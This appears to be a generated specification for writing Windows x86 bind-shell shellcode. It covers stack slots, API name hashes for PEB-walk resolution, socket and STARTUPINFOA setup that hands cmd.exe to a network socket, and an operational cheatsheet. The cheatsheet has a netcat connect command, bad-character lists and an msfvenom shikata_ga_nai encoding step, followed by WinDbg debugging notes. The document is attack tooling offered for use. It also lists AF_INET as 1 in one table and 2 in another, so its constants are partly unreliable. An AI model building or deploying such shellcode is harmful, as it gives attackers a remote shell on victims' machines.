# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `sub esp, 0x300` (0x300 bytes reserved)

## Export Context (reserved - do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |
| `[ebp-0x24]` | ws2_32.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x28]` | WSAStartup | ws2_32.dll |
| `[ebp-0x2c]` | WSASocketA | ws2_32.dll |
| `[ebp-0x30]` | bind | ws2_32.dll |
| `[ebp-0x34]` | listen | ws2_32.dll |
| `[ebp-0x38]` | accept | ws2_32.dll |
| `[ebp-0x3c]` | CreateProcessA | kernel32.dll |
| `[ebp-0x40]` | ExitProcess | kernel32.dll |
| `[ebp-0x44]` | LoadLibraryA | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x48]` | socket_handle | 4 |
| `[ebp-0x4c]` | bind_socket | 4 |
| `[ebp-0x50]` | wsa_ret | 4 |
| `[ebp-0x54]` | listen_socket | 4 |
| `[ebp-0x58]` | bind_ret | 4 |
| `[ebp-0x5c]` | listen_ret | 4 |
| `[ebp-0x60]` | client_socket | 4 |
| `[ebp-0x64]` | cpa_ret | 4 |

## Structures

| Offset | Structure | Size |
|--------|-----------|------|
| `[ebp-0x210]` | WSADATA | 0x190 |
| `[ebp-0x220]` | sockaddr_in | 0x10 |
| `[ebp-0x264]` | STARTUPINFOA | 0x44 |
| `[ebp-0x274]` | PROCESS_INFORMATION | 0x10 |

## Strings

| Offset | Label | Value | Size |
|--------|-------|-------|------|
| `[ebp-0x27c]` | cmd | cmd.exe | 8 |

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| CreateProcessA | `0x16b3fe72` | `[ebp-0x3c]` | process |
| ExitProcess | `0x73e2d87e` | `[ebp-0x40]` | process |
| LoadLibraryA | `0xec0e4e8e` | `[ebp-0x44]` | library |

### API Details

#### CreateProcessA

**Slot:** `[ebp-0x3c]`
**Hash:** `0x16b3fe72`
**Module:** kernel32.dll
**Category:** process

```c
BOOL CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpApplicationName | LPCSTR | NULL; command in lpCommandLine |
| 2 | lpCommandLine | LPSTR | pointer to cmd string, e.g. cmd.exe |
| 3 | lpProcessAttributes | LPSECURITY_ATTRIBUTES | NULL |
| 4 | lpThreadAttributes | LPSECURITY_ATTRIBUTES | NULL |
| 5 | bInheritHandles | BOOL | TRUE for stdio redirection |
| 6 | dwCreationFlags | DWORD | NULL |
| 7 | lpEnvironment | LPVOID | NULL |
| 8 | lpCurrentDirectory | LPCSTR | NULL |
| 9 | lpStartupInfo | LPSTARTUPINFOA | cb=0x44, STARTF_USESTDHANDLES |
| 10 | lpProcessInformation | LPPROCESS_INFORMATION | output; zero before call |

---

#### ExitProcess

**Slot:** `[ebp-0x40]`
**Hash:** `0x73e2d87e`
**Module:** kernel32.dll
**Category:** process

```c
VOID ExitProcess(UINT uExitCode)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | uExitCode | UINT | 0 for clean exit |

---

#### LoadLibraryA

**Slot:** `[ebp-0x44]`
**Hash:** `0xec0e4e8e`
**Module:** kernel32.dll
**Category:** library

```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpLibFileName | LPCSTR | e.g. ws2_32.dll |

---

## ws2_32.dll

Resolution: `LoadLibraryA("ws2_32.dll")` -> base stored at `[ebp-0x24]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| WSAStartup | `0x3bfcedcb` | `[ebp-0x28]` | network |
| WSASocketA | `0xadf509d9` | `[ebp-0x2c]` | network |
| bind | `0xc7701aa4` | `[ebp-0x30]` | network |
| listen | `0xe92eada4` | `[ebp-0x34]` | network |
| accept | `0x498649e5` | `[ebp-0x38]` | network |

### API Details

#### WSAStartup

**Slot:** `[ebp-0x28]`
**Hash:** `0x3bfcedcb`
**Module:** ws2_32.dll
**Category:** network

```c
int WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | wVersionRequested | WORD | MAKEWORD(2,2) = 0x0202 |
| 2 | lpWSAData | LPWSADATA | output buffer, allocate 0x190 bytes on stack |

---

#### WSASocketA

**Slot:** `[ebp-0x2c]`
**Hash:** `0xadf509d9`
**Module:** ws2_32.dll
**Category:** network

```c
SOCKET WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | af | int | AF_INET = 1 |
| 2 | type | int | SOCK_STREAM = 1 |
| 3 | protocol | int | IPPROTO_TCP = 6 |
| 4 | lpProtocolInfo | LPWSAPROTOCOL_INFOA | NULL |
| 5 | g | GROUP | NULL |
| 6 | dwFlags | DWORD | NULL |

---

#### bind

**Slot:** `[ebp-0x30]`
**Hash:** `0xc7701aa4`
**Module:** ws2_32.dll
**Category:** network

```c
int bind(SOCKET s, const struct sockaddr *addr, int namelen)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | listening socket from WSASocketA |
| 2 | addr | const struct sockaddr * | pointer to sockaddr_in with sin_family, sin_port, sin_addr |
| 3 | namelen | int | 0x10 (sizeof sockaddr_in) |

---

#### listen

**Slot:** `[ebp-0x34]`
**Hash:** `0xe92eada4`
**Module:** ws2_32.dll
**Category:** network

```c
int listen(SOCKET s, int backlog)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | bound socket from bind() |
| 2 | backlog | int | SOMAXCONN = 0x7fffffff; or small value like 1 |

---

#### accept

**Slot:** `[ebp-0x38]`
**Hash:** `0x498649e5`
**Module:** ws2_32.dll
**Category:** network

```c
SOCKET accept(SOCKET s, struct sockaddr *addr, int *addrlen)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | listening socket; blocks until client connects |
| 2 | addr | struct sockaddr * | NULL to ignore client address; or pointer to sockaddr_in |
| 3 | addrlen | int * | NULL if addr is NULL; or pointer to 0x10 |

---

---

# Structure Layouts

## WSADATA

**Size:** `0x190`
**Required by:** WSAStartup

_No field documentation (opaque output buffer)._

---

## sockaddr_in

**Size:** `0x10`
**Required by:** bind, accept

| Offset | Field | Size | Notes |
|--------|-------|------|-------|
| `+0x00` | sin_family | 2 | AF_INET = 0x0002 |
| `+0x02` | sin_port | 2 | network byte order, e.g. 0x2329 = port 9001 |
| `+0x04` | sin_addr | 4 | network byte order IPv4 address |
| `+0x08` | sin_zero | 8 | zeroed padding |

---

## STARTUPINFOA

**Size:** `0x44`
**Required by:** CreateProcessA

| Offset | Field | Size | Notes |
|--------|-------|------|-------|
| `+0x00` | cb | 4 | must be 0x44 |
| `+0x2c` | dwFlags | 4 | STARTF_USESTDHANDLES = 0x100 |
| `+0x38` | hStdInput | 4 | socket handle |
| `+0x3c` | hStdOutput | 4 | socket handle |
| `+0x40` | hStdError | 4 | socket handle |

---

## PROCESS_INFORMATION

**Size:** `0x10`
**Required by:** CreateProcessA

| Offset | Field | Size | Notes |
|--------|-------|------|-------|
| `+0x00` | hProcess | 4 | populated by Windows |
| `+0x04` | hThread | 4 | populated by Windows |
| `+0x08` | dwProcessId | 4 | populated by Windows |
| `+0x0c` | dwThreadId | 4 | populated by Windows |

---

---

# Operational Cheatsheet

**Template:** IRBindShellTemplate
**Target:** `127.0.0.1:4444`
**Bad characters:** `0x00` `0x0a` `0x0d`

## Setup Commands

**Connect to bind shell:**
```
nc -nv <TARGET_IP> 4444
```

**Connect (rlwrap):**
```
rlwrap nc -nv <TARGET_IP> 4444
```

## Encoding (if needed)

Remove bad chars with msfvenom (requires `shellcode.bin`):
```
cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode
```

---

# WinDbg Cheatsheet

Run `debug_runner.py` under 32-bit Python. Attach WinDbg to the
python.exe process. Set `bp <address>` using the printed shellcode
address, then press Enter in the script to start execution.

## Quick Reference

| Command | Description |
|---------|-------------|
| `bp <addr>` | Set breakpoint |
| `bl` | List breakpoints |
| `g` | Go (continue) |
| `t` | Step into |
| `p` | Step over |
| `pt` | Step to next return |
| `r` | Show all registers |
| `r eax` | Show one register |
| `u eip L10` | Disassemble next 16 instructions |
| `db <addr> L<n>` | Dump bytes |
| `dd <addr> L<n>` | Dump dwords |
| `da <addr>` | Dump ASCII string |
| `!address <addr>` | Show memory region info |

## Inspect API Pointers After Resolution

After the PEB walk and hash resolution, each resolved function
pointer is stored at its stack slot. Verify with:

```
dd ebp-0x28 L1    ; WSAStartup
dd ebp-0x2c L1    ; WSASocketA
dd ebp-0x30 L1    ; bind
dd ebp-0x34 L1    ; listen
dd ebp-0x38 L1    ; accept
dd ebp-0x3c L1    ; CreateProcessA
dd ebp-0x40 L1    ; ExitProcess
dd ebp-0x44 L1    ; LoadLibraryA
```

## Inspect Structures Before API Calls

### WSADATA (0x190 bytes)

Base address: `ebp-0x210`

```
dd ebp-0x210 L8    ; first 8 dwords
db ebp-0x210 L20    ; raw bytes
```

### sockaddr_in (0x10 bytes)

Base address: `ebp-0x220`

```
dd ebp-0x220 L4    ; first 4 dwords
db ebp-0x220 L10    ; raw bytes
```

Key fields:

- `db ebp-0x220 L2`  sin_family (+0x00)
- `db ebp-0x21e L2`  sin_port (+0x02)
- `dd ebp-0x21c L1`  sin_addr (+0x04)
- `dd ebp-0x218 L1`  sin_zero (+0x08)

### STARTUPINFOA (0x44 bytes)

Base address: `ebp-0x264`

```
dd ebp-0x264 L8    ; first 8 dwords
db ebp-0x264 L20    ; raw bytes
```

Key fields:

- `dd ebp-0x264 L1`  cb (+0x00)
- `dd ebp-0x238 L1`  dwFlags (+0x2c)
- `dd ebp-0x22c L1`  hStdInput (+0x38)
- `dd ebp-0x228 L1`  hStdOutput (+0x3c)
- `dd ebp-0x224 L1`  hStdError (+0x40)

### PROCESS_INFORMATION (0x10 bytes)

Base address: `ebp-0x274`

```
dd ebp-0x274 L4    ; first 4 dwords
db ebp-0x274 L10    ; raw bytes
```

Key fields:

- `dd ebp-0x274 L1`  hProcess (+0x00)
- `dd ebp-0x270 L1`  hThread (+0x04)
- `dd ebp-0x26c L1`  dwProcessId (+0x08)
- `dd ebp-0x268 L1`  dwThreadId (+0x0c)

## Inspect Stack Strings

```
da ebp-0x27c    ; cmd
```

## Breakpoint Strategy

Set breakpoints at each `call [ebp-0xNN]` in the generated
assembly to pause before each API call. After each call, check
`eax` for the return value:

```
bp <sc_base>+<offset_of_call_WSAStartup>  ; eax=0 on success
bp <sc_base>+<offset_of_call_WSASocketA>  ; eax=socket handle (not INVALID_SOCKET)
bp <sc_base>+<offset_of_call_bind>
bp <sc_base>+<offset_of_call_listen>
bp <sc_base>+<offset_of_call_accept>
bp <sc_base>+<offset_of_call_CreateProcessA>  ; eax!=0 on success
bp <sc_base>+<offset_of_call_ExitProcess>  ; does not return
bp <sc_base>+<offset_of_call_LoadLibraryA>
```

Find the call offsets by searching `generated.asm` for
`call [ebp-` instructions. Add the instruction's line offset
from the start of the shellcode to the base address.